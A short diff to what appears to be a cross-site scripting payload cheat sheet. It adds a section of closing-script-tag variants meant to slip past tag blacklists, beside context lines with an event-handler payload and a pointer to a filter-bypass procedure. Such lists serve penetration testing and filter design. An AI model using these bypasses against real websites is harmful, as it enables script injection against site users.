@@ -217,6 +217,14 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 <x ondrag=aconfirm()>drag it
 ```
 
+- Bypass tag blackilisting
+```
+</ScRipT>
+</script
+</script/>
+</script x>
+```
+
 **Filter bypass procedure by [Rodolfo Assis](https://twitter.com/rodoassis)**
 ```
 <x onxxx=1
